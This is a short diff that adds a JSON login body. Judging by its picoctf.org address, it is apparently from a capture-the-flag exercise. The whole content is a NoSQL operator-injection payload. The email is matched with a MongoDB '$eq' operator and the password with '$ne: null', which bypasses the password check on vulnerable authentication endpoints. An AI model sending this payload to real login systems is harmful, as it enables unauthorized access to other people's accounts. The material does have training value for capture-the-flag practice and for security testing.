@@ -1,0 +1,4 @@
+{
+  "email": "{\"$eq\":\"picoplayer355@picoctf.org\"}",
+  "password": "{\"$ne\":null}"
+}
